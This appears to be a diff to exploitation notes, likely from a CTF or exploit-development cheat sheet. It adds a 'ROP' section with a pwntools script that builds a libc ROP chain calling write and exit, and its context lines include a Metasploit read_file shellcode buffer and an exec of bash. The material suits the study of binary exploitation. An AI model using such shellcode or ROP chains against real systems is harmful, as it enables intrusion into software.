@@ -18,6 +18,8 @@ os.execlp("bash", "bash")
 The following shellcode open a fixed file and then write its contents
 of to a file descriptor passed as first argument into the stack:
 
+## Stack-based
+
 ```python
 # linux/x86/read_file - 84 bytes
 # http://www.metasploit.com
@@ -115,4 +117,23 @@ buf += "\x31\xdb"                     # 0x0000004f   2                     31db 
 buf += "\xcd\x80"                     # 0x00000051   2                     cd80  int 0x80             sys_exit()
 
 sys.stdout.write(buf)
+```
+
+## ROP
+
+```python
+import sys
+
+from pwnlib.rop import rop
+from pwnlib import constants
+from pwnlib.context import context
+
+context.arch = 'amd64'
+r = rop.ROP('libc.so.6')
+r.write(constants.STDOUT_FILENO, 0x400639, 5)
+r.exit()
+
+sys.stderr.write(r.dump())
+
+sys.stdout.write(str(r))
 ```
